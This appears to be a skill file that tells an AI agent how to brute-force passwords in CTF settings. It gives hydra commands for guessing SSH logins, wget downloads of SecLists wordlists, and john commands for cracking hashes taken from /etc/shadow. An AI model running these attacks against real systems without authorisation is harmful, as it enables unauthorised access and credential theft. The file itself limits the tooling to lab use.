---
name: bruteforce
description: Use this when you need to perform bruteforce attacks. Note that bruteforce attacks are most common in CTF environment, avoid bruteforce attacks during real assessments.
metadata: 
  requirements:
  - hydra
  - john
  - wget
  - gunzip
---

# Bruteforce

## Tools

Prefer `hydra` for network services. Use `john` only for offline hash cracking.
 
## Wordlists

If you are in a Kali Linux environment, you have access to common wordlists at `/usr/share/wordlists/`.
Check what wordlists are available:
```
ls /usr/share/wordlists
```
> Note: 'rockyou.txt' may need decompression, use `gunzip /usr/share/wordlists/rockyou.txt.gz`

If you are not in a Kali Linux environment or the wordlists are not present, download them using the following command:
```bash
wget -q <url> -O /tmp/wordlist.txt && echo "download ok" || echo "download failed"
```

Wordlist URLs:
* 200 Entries: `https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/master/Passwords/Common-Credentials/2025-199_most_used_passwords.txt`
* 10k Entries: `https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/10k-most-common.txt`

Start with a shorter wordlist, then proceed with larger ones if required.

If you have to write your own wordlist, write one entry per line. Never write passwords space-separated on a single line.

## Hydra Usage
 
SSH with known username:
 
```
hydra -l <username> -P <wordlist> ssh://<target> -t 4 -vV
```
 
SSH with unknown username (provide a user list):
 
```
hydra -L /tmp/users.txt -P /tmp/wordlist.txt ssh://<target> -t 4 -vV
```
 
Keep `-t 4` for SSH to avoid connection lockout. Use `-vV` to see each attempt.

## Managing Long-Running Execution
 
Hydra can take minutes on large wordlists. The execution environment may return
partial or empty output if the command is still running. Always redirect to a
file and poll:
 
```
hydra -l student -P /tmp/passwords.txt ssh://192.168.1.0 -t 4 -vV > /tmp/hydra_out.txt 2>&1 &
```
 
Check progress at any time:
 
```
cat /tmp/hydra_out.txt
```

A successful result looks like:
 
```
[22][ssh] host: 192.168.1.0   login: student   password: password
```

## John the Ripper (Offline Hash Cracking)
 
Use john when you have obtained a hash (e.g. from /etc/shadow):
 
```
john --wordlist=/usr/share/wordlists/rockyou.txt /tmp/hashes.txt
```
 
Show cracked passwords:
 
```
john --show /tmp/hashes.txt
```